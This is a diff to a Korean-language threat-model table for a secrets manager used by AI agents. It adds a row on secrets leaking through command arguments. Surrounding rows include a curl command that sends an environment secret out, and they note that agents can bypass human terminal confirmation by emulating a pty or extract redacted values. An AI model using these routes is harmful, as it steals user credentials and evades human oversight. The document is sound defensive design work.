@@ -274,6 +274,7 @@ flowchart TD
 | T11 | DoS | Keychain 확인 창으로 에이전트 정지 | 단일 바이너리, 서명 고정 검토 (§3.4) | [미검증] |
 | T12 | Information disclosure | 로그·패닉 메시지에 평문 | 비밀 타입의 `Debug` 비구현, 합성 비밀 누출 검사 | 의존성 내부 로그 |
 | T13 | Information disclosure | `keyharbor run`의 자식 프로세스가 env 값을 파일·네트워크로 내보냄 (`sh -c 'curl …?k=$KEY'`) | 출력 마스킹, 정책으로 env 항목별 허용 에이전트 제한, 항목별 `run_allowed`(login·card·identity·address는 기본 꺼짐), 사용 기록 | **막지 못함**. 환경 변수 주입 방식의 본질적 한계. `run_allowed`를 켜는 것은 사람 확인이 필요하지만 그 확인은 pty로 흉내 낼 수 있다(§3.1) |
+| T13a | Information disclosure | `keyharbor run`의 인자 치환(`-- curl -H 'Bearer {{secret:…}}'`)으로 들어간 값을 같은 사용자의 다른 프로세스가 `ps`로 읽음 | 인자에 값이 들어가면 stderr에 경고, 파일 통로(`--file`, `--template`: 0700 폴더 안 0600 파일, `run`이 끝나면 지움)를 권함 | **줄였음**. 인자는 쓸 수 있게 두었다(J-84). 파일 통로의 파일은 `run`이 도는 동안 같은 사용자가 읽을 수 있다 |
 | T14 | Information disclosure | 셸을 가진 에이전트가 `keyharbor` CLI의 평문 출력 경로를 직접 실행하거나 보호를 약하게 함 | CLI에 평문 출력 경로 없음 (§3.12 A), 약화 작업은 터미널 확인 (§3.12) | 관리 앱 GUI 자동화·프로세스 메모리 (N1), 터미널 확인은 pty 흉내로 우회 가능한 약한 경계 |
 | T15 | Information disclosure | 카드번호가 상점 페이지 텍스트로 다시 표시됨 | 카드번호 변형 마스킹 | 사이트 고유 표기 |
 | T16 | Information disclosure | 치환 뒤 Backspace·Delete·type 전환으로 값을 조금 바꿔 snapshot으로 읽기 (C1) | 치환받은 요소는 세션 동안 `[redacted]`, password 필드는 password 칸에만 | 페이지 스크립트가 값을 다른 곳으로 옮기는 경우 |
